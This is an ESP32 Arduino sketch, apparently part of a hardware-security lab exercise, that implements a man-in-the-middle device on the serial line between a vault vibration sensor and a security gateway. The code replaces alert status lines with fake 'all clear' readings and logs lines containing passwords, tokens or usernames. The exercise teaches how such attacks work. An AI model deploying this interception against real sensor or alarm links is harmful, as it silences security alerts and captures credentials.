/*
 * mitm.ino — Phase 3.5 (Stretch): "Man in the Middle"
 *
 * Sits between the vault sensor and the security gateway.
 * Receives real vibration data, suppresses all alerts,
 * and forwards fake "all clear" to the gateway.
 *
 * The drill is running. The sensor is screaming CRITICAL.
 * The gateway sees CLEAR. Nobody knows.
 *
 * Wiring:
 *   Sensor ESP32 GPIO 17 (TX2) → This ESP32 GPIO 4 (UART1 RX)
 *   This ESP32 GPIO 17 (UART2 TX) → Gateway ESP32 GPIO 16 (RX2)
 *   Common GND across all three boards
 *
 * UART allocation on this board:
 *   UART0 (USB)  — debug output to laptop
 *   UART1 (RX only, GPIO 4) — receives from sensor
 *   UART2 (TX only, GPIO 17) — forwards to gateway
 *
 * No external libraries required.
 */

#define SENSOR_RX_PIN  4
#define GATEWAY_TX_PIN 17
#define BAUD_RATE      9600

// ============================================
// MODIFY THESE — control the deception
// ============================================
bool  suppressAlerts = true;    // Replace CRITICAL/MEDIUM with CLEAR
bool  stealCreds     = true;    // Log intercepted credentials
int   fakeVibration  = 0;       // What vibration count the gateway sees
String fakeStatus    = "CLEAR"; // What status the gateway sees

HardwareSerial SensorUART(1);

unsigned long interceptCount = 0;

void setup() {
  Serial.begin(115200);
  SensorUART.begin(BAUD_RATE, SERIAL_8N1, SENSOR_RX_PIN, -1);
  Serial2.begin(BAUD_RATE, SERIAL_8N1, -1, GATEWAY_TX_PIN);

  Serial.println();
  Serial.println("===================================");
  Serial.println("  VAULT MITM INTERCEPTOR v1.0");
  Serial.println("  Phase 3.5: The Inside Job");
  Serial.println("===================================");
  Serial.println("Sensor → GPIO 4 (RX) | GPIO 17 (TX) → Gateway");
  Serial.println();
  Serial.println("Alert suppression: " + String(suppressAlerts ? "ON" : "OFF"));
  Serial.println("Credential theft:  " + String(stealCreds ? "ON" : "OFF"));
  Serial.println();
  Serial.println("Real alerts go in. Fake CLEAR goes out.");
  Serial.println("Waiting for traffic...");
  Serial.println();
}

String suppressTelemetry(String line) {
  // Look for vault status lines
  if (line.startsWith("VAULT_STATUS:")) {
    // Parse real values for logging
    String realStatus = "UNKNOWN";
    int colonPos = line.indexOf(':');
    int spacePos = line.indexOf(' ');
    if (colonPos >= 0 && spacePos > colonPos) {
      realStatus = line.substring(colonPos + 1, spacePos);
    }

    // Parse real vibration count
    int vibStart = line.indexOf("VIBRATION:") + 10;
    int vibEnd = line.indexOf(' ', vibStart);
    String realVib = (vibEnd > vibStart) ? line.substring(vibStart, vibEnd) : "?";

    // Log the truth
    Serial.println("  REAL:    STATUS:" + realStatus + " VIBRATION:" + realVib);

    if (suppressAlerts && realStatus != "CLEAR") {
      // Suppress the alert — send fake CLEAR
      Serial.println("  SENDING: STATUS:" + fakeStatus + " VIBRATION:" + String(fakeVibration));
      Serial.println("  ^^^^ ALERT SUPPRESSED ^^^^");
      Serial.println();

      // Parse events count from original to keep it consistent
      int evtStart = line.indexOf("EVENTS:") + 7;
      String events = (evtStart > 7) ? line.substring(evtStart) : "0";

      return "VAULT_STATUS:" + fakeStatus +
             " VIBRATION:" + String(fakeVibration) +
             " EVENTS:0";
    }

    // If already CLEAR, pass through
    Serial.println("  SENDING: (unmodified — already CLEAR)");
    Serial.println();
    return line;
  }

  return line;
}

void loop() {
  if (SensorUART.available()) {
    String incoming = SensorUART.readStringUntil('\n');
    incoming.trim();

    if (incoming.length() == 0) {
      Serial2.println();
      return;
    }

    interceptCount++;
    Serial.println("[MITM] #" + String(interceptCount) + " Intercepted:");
    Serial.println("  RAW: " + incoming);

    // Credential interception — log but forward unchanged
    if (incoming.indexOf("PASS") >= 0 || incoming.indexOf("TOKEN") >= 0 ||
        incoming.indexOf("USER") >= 0) {
      if (stealCreds) {
        Serial.println("  >>>> CREDENTIAL CAPTURED <<<<");
      }
      Serial2.println(incoming);
      Serial.println("  FORWARDED: (unmodified)");
      Serial.println();
      return;
    }

    // Suppress vault alerts
    String modified = suppressTelemetry(incoming);
    Serial2.println(modified);

    if (modified == incoming && !incoming.startsWith("VAULT_STATUS:")) {
      Serial.println("  FORWARDED: (unmodified)");
      Serial.println();
    }
  }
}
